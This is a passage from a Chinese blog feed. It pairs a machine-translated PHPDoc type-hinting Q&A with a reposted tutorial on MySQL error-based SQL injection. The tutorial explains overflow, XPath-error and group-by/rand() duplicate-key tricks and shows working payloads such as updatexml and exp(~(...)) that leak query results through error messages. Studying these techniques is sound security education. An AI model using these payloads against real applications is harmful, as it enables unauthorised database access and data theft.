*/</span></span><br></pre></td></tr></table></figure><p>所有的代码文件(例如循环内)，因为Zahymaka证实了他/他的答案。您的API用户不会被迫引用该文档块，以使代码完成。要只在一个地方有@return可以减少冗余(@var)作为mutch尽可能的。使用@var“docBlocks”会使您的代码变得最不可读。</p><p>最后你完成了看起来很难看看起来像大锤打破一个坚果？不是真的，因为你熟悉那些接口和干净的代码。记住：你的源代码是一次写/读很多。</p><p>如果IDE的代码完成无法使用此方法，请切换到更好的(例如IntelliJ IDEA，PhpStorm，Netbeans)或在IDE生成器的问题跟踪器上提交功能请求。</p><p>感谢Christian Weiss(来自德国)担任我的教练，并教我如此伟大的东西。 PS：在邢会见我和他</p><h2 id="第六种方案"><a href="#第六种方案" class="headerlink" title="第六种方案"></a>第六种方案</h2><p><a href="https://segmentfault.com/link.php?target=https%3A//github.com/php-fig/fig-standards/blob/211063eed7f4d9b4514b728d7b1810d9b3379dd1/proposed/phpdoc.md%23collections">PSR-5: PHPDoc</a>提出了一种形式的Generics-style表示法。</p><h3 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Type[]</span><br><span class="line">Type&lt;Type&gt;</span><br><span class="line">Type&lt;Type[, Type]...&gt;</span><br><span class="line">Type&lt;Type[|Type]...&gt;</span><br></pre></td></tr></table></figure><p>集合中的值可能甚至是另一个数组，甚至另一个集合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Type&lt;Type&lt;Type&gt;&gt;</span><br><span class="line">Type&lt;Type&lt;Type[, Type]...&gt;&gt;</span><br><span class="line">Type&lt;Type&lt;Type[|Type]...&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$x = [<span class="keyword">new</span> Name()];</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $x Name[] */</span></span><br><span class="line"></span><br><span class="line">$y = <span class="keyword">new</span> Collection([<span class="keyword">new</span> Name()]);</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $y Collection&lt;Name&gt; */</span></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Collection(); </span><br><span class="line">$a[] = <span class="keyword">new</span> Model_User(); </span><br><span class="line">$a-&gt;resetChanges(); </span><br><span class="line">$a[<span class="number">0</span>]-&gt;name = <span class="string">"George"</span>; </span><br><span class="line">$a-&gt;echoChanges();</span><br><span class="line"><span class="comment">/* <span class="doctag">@var</span> $a Collection&lt;Model_User&gt; */</span></span><br></pre></td></tr></table></figure><p>注意：如果您期望IDE执行代码辅助，那么另一个问题是IDE是否支持PHPDoc Generic-style集合符号。</p><p>从我的答案到<a href="https://segmentfault.com/link.php?target=https%3A//stackoverflow.com/a/39384337/934739">this question</a>。</p><h2 id="第七种方案"><a href="#第七种方案" class="headerlink" title="第七种方案"></a>第七种方案</h2><p>在NetBeans 7.0(也可能较低)中，您可以声明返回类型“具有文本对象的数组”，就像<code>@return Text</code>一样，并且代码提示将起作用：</p><p>编辑：使用@Bob Fanger建议更新示例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * get all Tests</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> Test|Array $tests</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAllTexts</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">array</span>(<span class="keyword">new</span> Test(), <span class="keyword">new</span> Test());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需使用它：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$tests = $controller-&gt;getAllTests();</span><br><span class="line"><span class="comment">//$tests-&gt; //codehinting works!</span></span><br><span class="line"><span class="comment">//$tests[0]-&gt; //codehinting works!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($tests <span class="keyword">as</span> $text)&#123;</span><br><span class="line"> <span class="comment">//$test-&gt; //codehinting works!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它不是完美的，但最好只是离开它只是”mixed”，女巫没有带来价值。</p><p>CONS是你被允许以数组为背景，因为文本对象将会抛出错误。</p><h2 id="第八种方案"><a href="#第八种方案" class="headerlink" title="第八种方案"></a>第八种方案</h2><p><strong>在Zend Studio中使用array[type]。</strong></p><p>在Zend Studio中，<code>array[MyClass]</code>或<code>array[int]</code>甚至<code>array[array[MyClass]]</code>都很棒。</p><h2 id="第九种方案"><a href="#第九种方案" class="headerlink" title="第九种方案"></a>第九种方案</h2><p>正如DanielaWaranie在答案中提到的那样 – 当您在$ collectionObject中迭代$ items时，有一种方法来指定$ item的类型：将<code>@return MyEntitiesClassName</code>添加到<code>current()</code>以及返回值的<code>Iterator</code>和<code>Iterator</code>和<code>ArrayAccess</code>方法的其余部分。</p><p>繁荣！ <code>/** @var SomeObj[] $collectionObj */</code>不需要<code>foreach</code>，并且与收藏对象一起使用，无需以<code>@return SomeObj[]</code>描述的特定方法返回收藏。</p><p>我怀疑并不是所有的IDE都支持它，但它在PhpStorm中工作得很好，这让我更开心。</p><p><strong>例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">MyCollection</span> <span class="keyword">implements</span> <span class="title">Countable</span>, <span class="title">Iterator</span>, <span class="title">ArrayAccess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> User</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">current</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;items[<span class="keyword">$this</span>-&gt;cursor];</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//... implement rest of the required `interface` methods and your custom</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="有什么有用的我会添加发布这个答案"><a href="#有什么有用的我会添加发布这个答案" class="headerlink" title="有什么有用的我会添加发布这个答案"></a>有什么有用的我会添加发布这个答案</h3><p>在我的情况下，<code>current()</code>和<code>interface</code>方法的其余部分在<code>Abstract</code> -collection类中实现，我不知道最终将在集合中存储什么样的实体。</p><p>所以这里是窍门：不要在抽象类中指定返回类型，而是在特定的集合类的描述中使用PhpDoc instuction <code>@method</code>。</p><p><strong>例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">printLogin</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;login;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Abstract</span> <span class="class"><span class="keyword">Class</span> <span class="title">MyCollection</span> <span class="keyword">implements</span> <span class="title">Countable</span>, <span class="title">Iterator</span>, <span class="title">ArrayAccess</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">protected</span> $items = [];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">current</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;items[<span class="keyword">$this</span>-&gt;cursor];</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//... implement rest of the required `interface` methods and your custom</span></span><br><span class="line"> <span class="comment">//... abstract methods which will be shared among child-classes</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@method</span> User current()</span></span><br><span class="line"><span class="comment"> * ...rest of methods (for ArrayAccess) if needed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UserCollection</span> <span class="keyword">extends</span> <span class="title">MyCollection</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">(User $user)</span> </span>&#123;</span><br><span class="line"> <span class="keyword">$this</span>-&gt;items[] = $user;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// User collection specific methods...</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，使用类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$collection = <span class="keyword">new</span> UserCollection();</span><br><span class="line">$collection-&gt;add(<span class="keyword">new</span> User(<span class="number">1</span>));</span><br><span class="line">$collection-&gt;add(<span class="keyword">new</span> User(<span class="number">2</span>));</span><br><span class="line">$collection-&gt;add(<span class="keyword">new</span> User(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($collection <span class="keyword">as</span> $user) &#123;</span><br><span class="line"> <span class="comment">// IDE should `recognize` method `printLogin()` here!</span></span><br><span class="line"> $user-&gt;printLogin();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次：我怀疑并不是所有的IDE都支持它，而PhpStorm则是这样。尝试你的，发表评论结果！</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="https://stackoverflow.com/questions/778564/phpdoc-type-hinting-for-array-of-objects%3Fanswertab%3Dvotes" target="_blank" rel="noopener">PHPDoc type hinting for array of objects?</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;/a&gt;问题描述&lt;/h2&gt;&lt;p&gt;因此，在PHPDoc中，可以在成员变量声明之上指定&lt;code&gt;@var&lt;/code&gt;来提示其类型。然后一个IDE，例如PHPEd将知道它正在使用什么类型的对象，并且能够为该变量提供代码洞察。&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Test&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;comment&quot;&gt;/** &lt;span class=&quot;doctag&quot;&gt;@var&lt;/span&gt; SomeObj */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; $someObjInstance;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这样做很好，直到我需要对一组对象做同样的事情，以便在以后迭代这些对象时才能获得正确的提示。&lt;/p&gt;
&lt;p&gt;那么，有没有办法声明一个PHPDoc标签来指定成员变量是&lt;code&gt;SomeObj&lt;/code&gt;的数组？ &lt;code&gt;@var&lt;/code&gt;数组是不够的，例如&lt;code&gt;@var array(SomeObj)&lt;/code&gt;似乎没有效果。&lt;/p&gt;
&lt;h2 id=&quot;最佳解决方案&quot;&gt;&lt;a href=&quot;#最佳解决方案&quot; class=&quot;headerlink&quot; title=&quot;最佳解决方案&quot;&gt;&lt;/a&gt;最佳解决方案&lt;/h2&gt;&lt;p&gt;在JetBrains的PhpStorm IDE中，您可以使用&lt;code&gt;/** @var SomeObj[] */&lt;/code&gt;，例如：&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/**&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt; * &lt;span class=&quot;doctag&quot;&gt;@return&lt;/span&gt; SomeObj[]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getSomeObjects&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;...&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;a href=&quot;https://segmentfault.com/link.php?target=http%3A//phpdoc.org/docs/latest/references/phpdoc/types.html%23arrays&quot;&gt;phpdoc documentation&lt;/a&gt;推荐这种方法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;specified containing a single type, the Type definition informs the reader of the type of each array element. Only one Type is then expected as element for a given array.&lt;/p&gt;
&lt;p&gt;Example: &lt;code&gt;@return int[]&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="php" scheme="http://www.twosee.cn/tags/php/"/>
    
      <category term="phpstorm" scheme="http://www.twosee.cn/tags/phpstorm/"/>
    
      <category term="ide" scheme="http://www.twosee.cn/tags/ide/"/>
    
  </entry>
  
  <entry>
    <title>[转] Mysql注入后利用</title>
    <link href="http://www.twosee.cn/2018/01/06/mysql-injection/"/>
    <id>http://www.twosee.cn/2018/01/06/mysql-injection/</id>
    <published>2018-01-05T17:33:18.000Z</published>
    <updated>2018-05-12T03:19:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p><p>MYSQL报错注入个人认为大体可以分为以下几类：</p><ol><li>BIGINT等数据类型溢出</li><li>xpath语法错误</li><li>concat+rand()+group_by()导致主键重复</li><li>一些特性</li></ol><p>下面就针对这几种错误类型看看背后的原理是怎样的。</p><a id="more"></a><h2 id="0x01-数据溢出"><a href="#0x01-数据溢出" class="headerlink" title="0x01 数据溢出"></a>0x01 数据溢出</h2><p>这里可以看到mysql是怎么处理整形的：<a href="https://dev.mysql.com/doc/refman/5.5/en/integer-types.html" target="_blank" rel="noopener">Integer Types (Exact Value)</a>，如下表：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://edu.aqniu.com/files/default/2017/03-08/142134e6bab6545212.jpg" alt="img" title="">                </div>                <div class="image-caption">img</div>            </figure><p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明<a href="https://dev.mysql.com/doc/refman/5.5/en/out-of-range-and-overflow.html" target="_blank" rel="noopener">out-of-range-and-overflow</a>，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 18446744073709551615+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range <span class="keyword">in</span> <span class="string">'(18446744073709551615 + 1)'</span></span><br></pre></td></tr></table></figure><p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ~0;</span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ~0+1;</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(~(0) + 1)&#39;</span><br></pre></td></tr></table></figure><p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select * from (select user())x);</span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x);</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select !(select * from (select user())x)+1;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| !(select * from (select user())x)+1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   2 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>同理，利用exp函数也会产生类似的溢出错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(709);</span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select exp(710);</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</span><br></pre></td></tr></table></figure><p>注入姿势：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select exp(~(select*from(select user())x));</span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select &#39;root@localhost&#39; from dual)))&#39;</span><br></pre></td></tr></table></figure><p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#39;root@localhost&#39;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure><p>而在mysql&gt;5.5.53时，则不能返回查询结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select(!x-~0)from(select(select user())x)a);</span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#96;a&#96;.&#96;x&#96;)) - ~(0))&#39;</span><br></pre></td></tr></table></figure><p>此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. *&#x2F;</span><br><span class="line"></span><br><span class="line">#define ERRMSGSIZE (512)</span><br></pre></td></tr></table></figure><h2 id="0x02-xpath语法错误"><a href="#0x02-xpath语法错误" class="headerlink" title="0x02 xpath语法错误"></a>0x02 xpath语法错误</h2><p>从mysql5.1.5开始提供两个<a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html" target="_blank" rel="noopener">XML查询和修改的函数</a>，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select extractvalue(1,&#39;&#x2F;a&#x2F;b&#39;);</span><br><span class="line">+------------------------+</span><br><span class="line">| extractvalue(1,&#39;&#x2F;a&#x2F;b&#39;) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                        |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br><span class="line">mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span><br></pre></td></tr></table></figure><h2 id="0x03-主键重复"><a href="#0x03-主键重复" class="headerlink" title="0x03 主键重复"></a>0x03 主键重复</h2><p>这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*) from test group by concat(version(),floor(rand(0)*2));</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;5.7.171&#39; for key &#39;&lt;group_key&gt;&#39;</span><br></pre></td></tr></table></figure><p>可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#39;5.7.171&#39; for key &#39;&lt;group_key&gt;&#39;</span><br></pre></td></tr></table></figure><p>这种报错方法的本质是因为<code>floor(rand(0)*2)</code>的重复性，导致group by语句出错。<code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。举个例子，表中数据如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from test;</span><br><span class="line">+------+-------+</span><br><span class="line">| id   | name  |</span><br><span class="line">+------+-------+</span><br><span class="line">| 0    | jack  |</span><br><span class="line">| 1    | jack  |</span><br><span class="line">| 2    | tom   |</span><br><span class="line">| 3    | candy |</span><br><span class="line">| 4    | tommy |</span><br><span class="line">| 5    | jerry |</span><br><span class="line">+------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>我们以<code>select count(*) from test group by name</code>语句说明大致过程如下：</p><ul><li>先是建立虚拟表，其中key为主键，不可重复：</li></ul><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td></td></tr></tbody></table><ul><li>开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1：</li></ul><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td>jack</td><td>1</td></tr></tbody></table><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td>jack</td><td>1+1</td></tr></tbody></table><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td>jack</td><td>1+1</td></tr><tr><td>tom</td><td>1</td></tr></tbody></table><table><thead><tr><th>key</th><th>count(*)</th></tr></thead><tbody><tr><td>jack</td><td>1+1</td></tr><tr><td>tom</td><td>1</td></tr><tr><td>candy</td><td>1</td></tr></tbody></table><p>当这个操作遇到rand(0)*2时，就会发生错误，其原因在于rand(0)是个稳定的序列，我们计算两次rand(0)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 